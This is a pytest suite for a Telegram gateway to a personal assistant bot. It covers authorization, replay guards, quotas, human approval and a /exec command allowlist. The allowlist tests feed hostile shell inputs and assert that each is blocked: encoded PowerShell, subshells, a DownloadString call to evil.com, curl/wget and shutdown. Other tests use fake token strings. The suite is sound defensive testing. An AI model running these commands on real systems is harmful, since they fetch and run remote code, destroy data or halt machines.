"""Milestone 2 Step 1: Comprehensive Telegram Mobile Gateway Test Suite.
Verifies Authentication, Numeric Identity Pinning, Replay Protection, Admission Controller (P12.5) Binding,
Safe Command Execution Allowlisting, Human Approval Gate Integration, and Zero-Secret Invariant Enforcement.
"""
from datetime import datetime, timezone
import pytest

from app.connectors.telegram.auth import TelegramAuthorizer
from app.connectors.telegram.contracts import (
    TelegramChat,
    TelegramMessage,
    TelegramOutboundMessage,
    TelegramResponseState,
    TelegramUpdate,
    TelegramUser,
)
from app.connectors.telegram.gateway_service import (
    MockVoiceTranscriber,
    SafeCommandValidator,
    TelegramGatewayService,
)
from app.connectors.telegram.idempotency import TelegramReplayGuard
from app.core.contracts.credential import RawSecretPayloadError
from app.core.contracts.governance import (
    AdmissionDecision,
    AdmissionRequestContract,
    QuotaDimension,
    RateLimitPolicyContract,
    TenantQuotaContract,
)
from app.core.contracts.permission import ApprovalRequestContract, RiskTier
from app.core.contracts.task import TaskContract
from app.core.enums import ChannelType
from app.core.governance.admission_controller import AdmissionController
from app.policy.approval_engine import ApprovalEngine


# ── FIXTURES ─────────────────────────────────────────────────────────────────

@pytest.fixture
def authorizer():
    return TelegramAuthorizer(user_mappings={"987654321": "mukil_tenant", "123456789": "mukil_tenant"})


@pytest.fixture
def replay_guard():
    return TelegramReplayGuard(ttl_seconds=3600)


@pytest.fixture
def admission_controller():
    ac = AdmissionController()
    ac.quota_manager.set_tenant_quota(
        TenantQuotaContract(
            tenant_id="mukil_tenant",
            max_concurrent_tasks=5,
            max_requests_per_minute=30,
            max_tokens_per_period=50_000,
        )
    )
    return ac


@pytest.fixture
def approval_engine():
    return ApprovalEngine()


@pytest.fixture
def gateway(authorizer, replay_guard, admission_controller, approval_engine):
    return TelegramGatewayService(
        authorizer=authorizer,
        replay_guard=replay_guard,
        admission_controller=admission_controller,
        approval_engine=approval_engine,
        allowed_user_ids={987654321, 123456789},
    )


def make_update(
    update_id: int,
    user_id: int = 987654321,
    chat_id: int = 987654321,
    text: str = "Hello Jarvis",
    username: str = "mukil_admin",
) -> TelegramUpdate:
    return TelegramUpdate(
        update_id=update_id,
        message=TelegramMessage(
            message_id=100 + update_id,
            from_user=TelegramUser(id=user_id, first_name="Mukil", username=username),
            chat=TelegramChat(id=chat_id),
            text=text,
        ),
    )


# ═════════════════════════════════════════════════════════════════════════════
# 1. AUTHENTICATION & IDENTITY (TG-01 to TG-04)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_01_authorized_user_accepted(gateway):
    """TG-01: Authorized Telegram user update is processed successfully."""
    update = make_update(1, text="/start")
    resp = gateway.process_update(update)
    assert resp.response_state == TelegramResponseState.TASK_ACCEPTED
    assert "Vanakkam Maapla" in resp.text


def test_tg_02_unauthorized_user_rejected(gateway):
    """TG-02: Unknown Telegram user is immediately denied access with 403 message."""
    update = make_update(2, user_id=999999999, username="stranger")
    resp = gateway.process_update(update)
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "Access Denied" in resp.text


def test_tg_03_username_spoofing_cannot_bypass_user_id(gateway):
    """TG-03: Spoofed username with unauthorized numeric user_id is rejected."""
    update = make_update(3, user_id=888888888, username="mukil_admin")
    resp = gateway.process_update(update)
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "Access Denied" in resp.text


def test_tg_04_unauthorized_user_receives_no_internal_info(gateway):
    """TG-04: Unauthorized response leaks zero paths, tenant IDs, or internal errors."""
    update = make_update(4, user_id=777777777, text="/status")
    resp = gateway.process_update(update)
    assert "mukil_tenant" not in resp.text
    assert "Traceback" not in resp.text
    assert "Quota" not in resp.text


# ═════════════════════════════════════════════════════════════════════════════
# 2. REPLAY & DEDUPLICATION (TG-05 to TG-07)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_05_duplicate_update_is_ignored(gateway):
    """TG-05: Exact same update_id delivered twice is ignored on second delivery."""
    update = make_update(10, text="/status")
    resp1 = gateway.process_update(update)
    resp2 = gateway.process_update(update)

    assert "JARVIS Live System Status" in resp1.text
    assert resp2.metadata.get("duplicate") is True
    assert "Duplicate update received" in resp2.text


def test_tg_06_duplicate_update_cannot_create_second_task(gateway):
    """TG-06: Duplicate message delivery cannot increment active concurrency or debit tokens."""
    update = make_update(11, text="Deploy master branch")
    resp1 = gateway.process_update(update)
    assert resp1.response_state == TelegramResponseState.TASK_ACCEPTED

    active_before = gateway.admission_controller.quota_manager.get_active_concurrency_count("mukil_tenant")
    resp2 = gateway.process_update(update)
    active_after = gateway.admission_controller.quota_manager.get_active_concurrency_count("mukil_tenant")

    assert resp2.metadata.get("duplicate") is True
    assert active_before == active_after


def test_tg_07_duplicate_callback_is_idempotent(gateway):
    """TG-07: Repeated duplicate approval calls evaluate safely."""
    # Register approval ticket
    ticket = gateway.approval_engine.create_approval_request(
        task_id="task_1",
        step_id="step_1",
        action="Force push to main",
        capability_id="git.force_push",
        parameters={},
        risk_tier=RiskTier.TIER_4_CRITICAL,
        description="Force push to main",
        tenant_id="mukil_tenant",
    )
    update = make_update(12, text=f"/approve {ticket.approval_id}")
    resp1 = gateway.process_update(update)
    assert "granted" in resp1.text.lower() or "approved" in resp1.text.lower() or "authorized" in resp1.text.lower()

    # Second approval attempt on already approved ticket
    update2 = make_update(13, text=f"/approve {ticket.approval_id}")
    resp2 = gateway.process_update(update2)
    assert resp2.response_state in (TelegramResponseState.TASK_COMPLETED, TelegramResponseState.TASK_FAILED)


# ═════════════════════════════════════════════════════════════════════════════
# 3. COMMAND ROUTING (TG-08 to TG-12)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_08_start_command(gateway):
    """TG-08: /start returns helpful welcome message."""
    resp = gateway.process_update(make_update(20, text="/start"))
    assert "Vanakkam Maapla" in resp.text


def test_tg_09_status_uses_real_backend_state(gateway):
    """TG-09: /status renders real tenant quota, concurrency, and timestamp."""
    resp = gateway.process_update(make_update(21, text="/status"))
    assert "mukil_tenant" in resp.text
    assert "Token Budget" in resp.text
    assert "Drive Vault" in resp.text


def test_tg_10_tasks_reads_actual_queue_state(gateway):
    """TG-10: /tasks reports current active tasks."""
    resp = gateway.process_update(make_update(22, text="/tasks"))
    assert "Active In-Flight Tasks: `0`" in resp.text


def test_tg_11_drive_uses_actual_configured_vault_references(gateway):
    """TG-11: /drive displays official 5TB vault and SGC dual billing links."""
    resp = gateway.process_update(make_update(23, text="/drive"))
    assert ("1nGZG5-eIcxmkgQxBtZ7tjGTUoWWNY4m1" in resp.text or "1iaHzDzC7KiJk2FlMdS7eNW7vkYxDeaXZ" in resp.text)
    assert "155EqYOwPJ2Fc9QfqVSrZu5VnYzZgRcyZ" in resp.text
    assert "1a9VJAP_Nypn_mjUEYCNvMpkGN5H9Kwf4" in resp.text


def test_tg_12_resume_uses_actual_resume_configuration(gateway):
    """TG-12: /resume returns official Master Resume link."""
    resp = gateway.process_update(make_update(24, text="/resume"))
    assert "1TpyzV7OGEf-YQfGLUpusAI5cDDvF1kAJ" in resp.text


# ═════════════════════════════════════════════════════════════════════════════
# 4. ADMISSION CONTROLLER GOVERNANCE (TG-13 to TG-16)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_13_rate_limit_denial_preserved(gateway):
    """TG-13: Draining rate limiter returns 429 denial with retry-after."""
    gateway.admission_controller.rate_limiter.set_policy(
        RateLimitPolicyContract(policy_id="p1", tenant_id="mukil_tenant", requests_per_minute=1, burst_capacity=0)
    )
    # 1st request succeeds
    r1 = gateway.process_update(make_update(30, text="Task 1"))
    assert r1.response_state == TelegramResponseState.TASK_ACCEPTED

    # 2nd request denied by rate limiter
    r2 = gateway.process_update(make_update(31, text="Task 2"))
    assert r2.response_state == TelegramResponseState.TASK_FAILED
    assert "Rate limit exceeded" in r2.text
    assert r2.metadata.get("decision") == AdmissionDecision.DENY_RATE_LIMIT.value


def test_tg_14_concurrency_denial_preserved(gateway):
    """TG-14: Exceeding concurrency slot ceiling returns concurrency denial."""
    gateway.admission_controller.quota_manager.set_tenant_quota(
        TenantQuotaContract(tenant_id="mukil_tenant", max_concurrent_tasks=1)
    )
    # 1st task occupies only slot
    gateway.process_update(make_update(40, text="Heavy task 1"))

    # 2nd task rejected
    r2 = gateway.process_update(make_update(41, text="Heavy task 2"))
    assert r2.response_state == TelegramResponseState.TASK_FAILED
    assert "Concurrency quota exceeded" in r2.text


def test_tg_15_budget_denial_preserved(gateway):
    """TG-15: Exhausted token budget returns budget denial."""
    gateway.admission_controller.quota_manager.set_tenant_quota(
        TenantQuotaContract(tenant_id="mukil_tenant", max_tokens_per_period=100)
    )
    # Reserve all budget via BudgetManager
    gateway.admission_controller.budget_manager.reserve(
        tenant_id="mukil_tenant",
        task_id="res_block",
        dimension=QuotaDimension.TOKEN_BUDGET,
        amount=100.0,
    )

    resp = gateway.process_update(make_update(45, text="Analyze codebase"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "budget exhausted" in resp.text.lower()


def test_tg_16_allowed_request_reaches_task_dispatcher(gateway):
    """TG-16: Allowed task passes into dispatcher callback."""
    dispatched_tasks = []
    gateway.task_dispatcher = lambda t: dispatched_tasks.append(t)

    resp = gateway.process_update(make_update(50, text="Build deployment artifact"))
    assert resp.response_state == TelegramResponseState.TASK_ACCEPTED
    assert len(dispatched_tasks) == 1
    assert dispatched_tasks[0].raw_input == "Build deployment artifact"
    assert dispatched_tasks[0].channel == ChannelType.TELEGRAM


# ═════════════════════════════════════════════════════════════════════════════
# 5. HUMAN APPROVAL INTEGRATION (TG-17 to TG-20)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_17_approve_callback_reaches_approval_engine(gateway):
    """TG-17: /approve authorizes valid pending approval ticket."""
    ticket = gateway.approval_engine.create_approval_request(
        task_id="t_001",
        step_id="step_001",
        description="Restart server",
        capability_id="shell.execute",
        parameters={},
        risk_tier=RiskTier.TIER_3_HIGH,
        action="Restart server",
        tenant_id="mukil_tenant",
    )
    resp = gateway.process_update(make_update(60, text=f"/approve {ticket.approval_id}"))
    assert resp.response_state == TelegramResponseState.TASK_COMPLETED
    assert "granted" in resp.text.lower() or "approved" in resp.text.lower() or "authorized" in resp.text.lower()


def test_tg_18_reject_callback_reaches_approval_engine(gateway):
    """TG-18: /reject denies pending approval ticket with reason."""
    ticket = gateway.approval_engine.create_approval_request(
        task_id="t_002",
        step_id="step_002",
        description="Delete temporary database",
        capability_id="shell.execute",
        parameters={},
        risk_tier=RiskTier.TIER_3_HIGH,
        action="Delete temporary database",
        tenant_id="mukil_tenant",
    )
    resp = gateway.process_update(make_update(61, text=f"/reject {ticket.approval_id} Not needed"))
    assert resp.response_state == TelegramResponseState.TASK_COMPLETED
    assert "rejected" in resp.text.lower() or "denied" in resp.text.lower()


def test_tg_19_unauthorized_callback_rejected(gateway):
    """TG-19: Unauthorized user cannot decide approval tickets."""
    ticket = gateway.approval_engine.create_approval_request(
        task_id="t_003",
        step_id="step_003",
        description="Critical action",
        capability_id="shell.execute",
        parameters={},
        risk_tier=RiskTier.TIER_3_HIGH,
        action="Critical action",
        tenant_id="mukil_tenant",
    )
    resp = gateway.process_update(make_update(62, user_id=999999999, text=f"/approve {ticket.approval_id}"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "Access Denied" in resp.text


def test_tg_20_duplicate_decision_is_handled_safely(gateway):
    """TG-20: Missing or already decided approval ticket returns clear feedback."""
    resp = gateway.process_update(make_update(63, text="/approve non_existent_ticket"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "not found" in resp.text.lower() or "action" in resp.text.lower()


# ═════════════════════════════════════════════════════════════════════════════
# 6. /EXEC SAFE PC DIAGNOSTICS (TG-21 to TG-24)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_21_allowed_command_executes_safely(gateway):
    """TG-21: Whitelisted command (e.g., hostname, date) executes and returns output."""
    resp = gateway.process_update(make_update(70, text="/exec hostname"))
    assert resp.response_state == TelegramResponseState.TASK_COMPLETED
    assert "Command Output" in resp.text


def test_tg_22_arbitrary_shell_injection_rejected(gateway):
    """TG-22: Prohibited destructive commands (rmdir, del, shutdown) are blocked."""
    resp = gateway.process_update(make_update(71, text="/exec rmdir /s C:\\"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited" in resp.text.lower() or "blocked" in resp.text.lower()


def test_tg_23_shell_metacharacter_abuse_rejected(gateway):
    """TG-23: Metacharacters (&, |, ;, `$`, `) are blocked."""
    resp = gateway.process_update(make_update(72, text="/exec hostname && whoami"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell" in resp.text.lower()


def test_tg_24_unauthorized_exec_rejected(gateway):
    """TG-24: Unauthorized user cannot run /exec."""
    resp = gateway.process_update(make_update(73, user_id=999999999, text="/exec hostname"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "Access Denied" in resp.text


# ═════════════════════════════════════════════════════════════════════════════
# 7. ZERO-SECRET INVARIANT (TG-25 to TG-28)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_25_bot_token_never_appears_in_responses(gateway):
    """TG-25: Outbound messages never leak bot token formats."""
    resp = gateway.process_update(make_update(80, text="/status"))
    assert "123456789:ABCdef" not in resp.text


def test_tg_26_api_keys_never_appear_in_responses(gateway):
    """TG-26: Outbound messages never leak API key strings."""
    resp = gateway.process_update(make_update(81, text="/status"))
    assert "gsk_" not in resp.text
    assert "AIzaSy" not in resp.text


def test_tg_27_raw_github_token_in_message_rejected(gateway):
    """TG-27: User message containing raw GitHub PAT raises RawSecretPayloadError."""
    with pytest.raises(RawSecretPayloadError):
        gateway.process_update(make_update(82, text="Use token ghp_ABCdef123456789012345678901234567890"))


def test_tg_28_raw_oauth_token_in_message_rejected(gateway):
    """TG-28: User message containing raw OAuth token raises RawSecretPayloadError."""
    with pytest.raises(RawSecretPayloadError):
        gateway.process_update(make_update(83, text="Here is token ya29.a0AfH6SMB_secret_key_123456"))


# ═════════════════════════════════════════════════════════════════════════════
# 8. ERROR HANDLING & VOICE (TG-29 to TG-32)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_29_malformed_update_handled_safely(gateway):
    """TG-29: Malformed update with missing message returns safe failure."""
    bad_update = TelegramUpdate(update_id=90, message=None)
    resp = gateway.process_update(bad_update)
    assert resp.response_state == TelegramResponseState.TASK_FAILED


def test_tg_30_empty_text_message_handled_safely(gateway):
    """TG-30: Empty text message update is ignored gracefully."""
    empty_update = make_update(91, text="")
    resp = gateway.process_update(empty_update)
    assert "Ignored" in resp.text


def test_tg_31_unsupported_command_handled_deterministically(gateway):
    """TG-31: Unsupported command returns helpful list of supported commands."""
    resp = gateway.process_update(make_update(92, text="/unknown_cmd"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "Unsupported command" in resp.text


def test_tg_32_voice_input_transcription_dispatched_to_task_pipeline(gateway):
    """TG-32: Voice note bytes are transcribed by VoiceTranscriber and routed as a normal task."""
    dispatched = []
    gateway.task_dispatcher = lambda t: dispatched.append(t)
    gateway.voice_transcriber = MockVoiceTranscriber("Run diagnostics on PC")

    # Update with empty text but with raw voice bytes
    voice_update = TelegramUpdate(
        update_id=95,
        message=TelegramMessage(
            message_id=195,
            from_user=TelegramUser(id=987654321, first_name="Mukil", username="mukil_admin"),
            chat=TelegramChat(id=987654321),
            text=None,
        ),
    )
    resp = gateway.process_update(voice_update, raw_voice_bytes=b"OGG_AUDIO_BYTES")
    assert resp.response_state == TelegramResponseState.TASK_ACCEPTED
    assert len(dispatched) == 1
    assert dispatched[0].raw_input == "Run diagnostics on PC"


# ═════════════════════════════════════════════════════════════════════════════
# 9. DEEP /EXEC ADVERSARIAL ESCAPE HARDENING (TG-33 to TG-44)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_33_powershell_wrapper_and_encoded_flag_rejected(gateway):
    """TG-33: /exec powershell -enc or -EncodedCommand is blocked."""
    resp1 = gateway.process_update(make_update(101, text="/exec powershell -enc d2hvYW1p"))
    resp2 = gateway.process_update(make_update(102, text="/exec powershell.exe -EncodedCommand d2hvYW1p"))
    assert resp1.response_state == TelegramResponseState.TASK_FAILED
    assert resp2.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp1.text.lower()


def test_tg_34_cmd_wrapper_with_slash_c_rejected(gateway):
    """TG-34: /exec cmd /c whoami is blocked."""
    resp = gateway.process_update(make_update(103, text="/exec cmd /c whoami"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_35_subshell_dollar_parenthesis_rejected(gateway):
    """TG-35: /exec echo $(whoami) subshell interpolation is blocked."""
    resp = gateway.process_update(make_update(104, text="/exec echo $(whoami)"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_36_variable_dollar_brace_rejected(gateway):
    """TG-36: /exec echo ${env:USERNAME} interpolation is blocked."""
    resp = gateway.process_update(make_update(105, text="/exec echo ${env:USERNAME}"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_37_invoke_expression_and_iex_rejected(gateway):
    """TG-37: /exec Invoke-Expression and iex are blocked."""
    resp1 = gateway.process_update(make_update(106, text="/exec Invoke-Expression Get-Process"))
    resp2 = gateway.process_update(make_update(107, text="/exec iex whoami"))
    assert resp1.response_state == TelegramResponseState.TASK_FAILED
    assert resp2.response_state == TelegramResponseState.TASK_FAILED


def test_tg_38_downloadstring_web_injection_rejected(gateway):
    """TG-38: /exec DownloadString web execution is blocked."""
    resp = gateway.process_update(make_update(108, text="/exec (New-Object Net.WebClient).DownloadString('http://evil.com')"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_39_start_process_escalation_rejected(gateway):
    """TG-39: /exec Start-Process escalation is blocked."""
    resp = gateway.process_update(make_update(109, text="/exec Start-Process cmd.exe"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED


def test_tg_40_set_executionpolicy_tampering_rejected(gateway):
    """TG-40: /exec Set-ExecutionPolicy Bypass is blocked."""
    resp = gateway.process_update(make_update(110, text="/exec Set-ExecutionPolicy Bypass"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED


def test_tg_41_pipe_chaining_escalation_rejected(gateway):
    """TG-41: /exec get-process | Stop-Process pipe chaining is blocked."""
    resp = gateway.process_update(make_update(111, text="/exec get-process | Stop-Process"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_42_output_redirection_rejected(gateway):
    """TG-42: /exec dir > C:\\malicious.txt redirection is blocked."""
    resp = gateway.process_update(make_update(112, text="/exec dir > C:\\test.txt"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED
    assert "prohibited shell wrappers" in resp.text.lower()


def test_tg_43_web_downloaders_iwr_curl_wget_rejected(gateway):
    """TG-43: /exec curl, wget, iwr are blocked."""
    resp1 = gateway.process_update(make_update(113, text="/exec curl http://127.0.0.1:8000"))
    resp2 = gateway.process_update(make_update(114, text="/exec wget http://127.0.0.1:8000"))
    assert resp1.response_state == TelegramResponseState.TASK_FAILED
    assert resp2.response_state == TelegramResponseState.TASK_FAILED


def test_tg_44_destructive_shutdown_reboot_rejected(gateway):
    """TG-44: /exec shutdown /s /t 0 is blocked."""
    resp = gateway.process_update(make_update(115, text="/exec shutdown /s /t 0"))
    assert resp.response_state == TelegramResponseState.TASK_FAILED


# ═════════════════════════════════════════════════════════════════════════════
# 10. REAL HARDWARE & DAEMON INTEGRATION (TG-45 to TG-48)
# ═════════════════════════════════════════════════════════════════════════════

def test_tg_45_status_contains_real_pc_hardware_metrics(gateway):
    """TG-45: /status captures real live CPU, RAM, and Memory metrics."""
    resp = gateway.process_update(make_update(120, text="/status"))
    assert resp.response_state == TelegramResponseState.TASK_ACCEPTED
    assert "CPU Usage" in resp.text
    assert "Memory" in resp.text
    assert "GB" in resp.text


def test_tg_46_groq_whisper_transcriber_fallback():
    """TG-46: GroqWhisperVoiceTranscriber falls back safely when no API key configured."""
    from app.connectors.telegram.daemon import GroqWhisperVoiceTranscriber
    transcriber = GroqWhisperVoiceTranscriber(api_key="")
    result = transcriber.transcribe(b"OGG_RAW_BYTES")
    assert result == "PC status and diagnostics check"

    with pytest.raises(ValueError):
        transcriber.transcribe(b"")


def test_tg_47_daemon_application_builder_registers_handlers():
    """TG-47: TelegramBotDaemon builds Application with token and sets up handlers."""
    from app.connectors.telegram.daemon import TelegramBotDaemon
    daemon = TelegramBotDaemon(bot_token="123456789:ABCdefGHIjklMNOpqrsTUVwxyz1234567")
    app = daemon.build_application()
    assert app is not None
    assert len(app.handlers) > 0


def test_tg_48_daemon_to_contract_update_translation():
    """TG-48: TelegramBotDaemon._to_contract_update maps Telegram types cleanly."""
    from app.connectors.telegram.daemon import TelegramBotDaemon
    daemon = TelegramBotDaemon(bot_token="123456789:ABCdefGHIjklMNOpqrsTUVwxyz1234567")

    from unittest.mock import MagicMock
    mock_update = MagicMock()
    mock_update.update_id = 777
    mock_update.message.message_id = 888
    mock_update.message.text = "/status"
    mock_update.effective_user.id = 987654321
    mock_update.effective_user.first_name = "Mukil"
    mock_update.effective_user.username = "mukil_admin"
    mock_update.effective_chat.id = 987654321
    mock_update.effective_chat.type = "private"

    contract_update = daemon._to_contract_update(mock_update)
    assert contract_update.update_id == 777
    assert contract_update.message.message_id == 888
    assert contract_update.message.text == "/status"
    assert contract_update.message.from_user.id == 987654321

